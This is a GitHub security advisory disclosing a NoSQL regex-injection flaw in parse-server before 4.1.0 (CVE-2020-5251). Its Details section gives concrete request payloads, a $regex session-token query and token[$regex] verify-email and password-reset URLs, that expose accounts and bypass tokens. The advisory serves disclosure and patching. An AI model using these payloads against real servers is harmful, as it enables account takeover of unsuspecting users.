# [H] Information disclosure in parse-server

## Summary
Severity: High
Advisory: GHSA-h4mf-75hf-67w4
CVE: CVE-2020-5251
CWE: CWE-200, CWE-285
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2020-03-04
Source: https://github.com/advisories/GHSA-h4mf-75hf-67w4
Type: github-advisory

## Affected
- npm: `parse-server` — affected >=0 <4.1.0

## Details
1. you can fetch all the users' objects, by using regex in the NoSQL query.
Using the NoSQL, you can use a regex on sessionToken `("_SessionToken":{"$regex":"r:027f"}}` and find valid accounts this way.

Using this method, it's possible to retrieve accounts without interaction from the users.

GET /parse/users/me HTTP/1.1
```
{
  "_ApplicationId": "appName",
  "_JavaScriptKey": "javascriptkey",
  "_ClientVersion": "js2.10.0",
  "_InstallationId": "ca713ee2-6e60-d023-a8fe-14e1bfb2f300",
  "_SessionToken": {
    "$regex": "r:5"
  }
}
```
When trying it with an update query the same thing luckily doesn't seem to work:
POST /parse/classes/_User/PPNk59jPPZ

2. There is another similar vulnerability in verify email and the request password reset.

If you sign up with someone else's email address, you can simply use regex in the token param to verify the account: `http://localhost:1337/parse/apps/kickbox/verify_email?token[$regex]=a&username=some@email.com`

The same thing can be done for reset password: `http://localhost:1337/parse/apps/kickbox/request_password_reset?token[$regex]=a&username=some@email.com`

You may need to do it a few times with a different letter/number, but as long as the tokens contain the character it will succeed.

## References
- https://github.com/parse-community/parse-server/security/advisories/GHSA-h4mf-75hf-67w4
- https://nvd.nist.gov/vuln/detail/CVE-2020-5251
- https://github.com/parse-community/parse-server/commit/3a3a5eee5ffa48da1352423312cb767de14de269
